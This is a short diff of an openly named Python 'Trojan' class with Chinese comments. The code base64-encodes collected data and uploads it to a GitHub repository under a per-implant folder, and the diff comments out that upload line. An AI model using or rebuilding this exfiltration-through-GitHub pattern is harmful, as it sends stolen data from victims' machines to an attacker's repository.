@@ -59,7 +59,7 @@ class Trojan:
         message = datetime.now().isoformat()  # 使用当前时间作为文件名
         remote_path = f'data/{self.id}/{message}.data'  # 生成远程路径
         bindata = bytes('%r' % data, 'utf-8')  # 将结果转换为字节
-        self.repo.create_file(remote_path, message, base64.b64encode(bindata))  # 创建文件并上传到GitHub
+        # self.repo.create_file(remote_path, message, base64.b64encode(bindata))  # 创建文件并上传到GitHub
 
         # 创建存储结果的文件夹（如果不存在）
         if not self.repo.contents(f'data/{self.id}'):
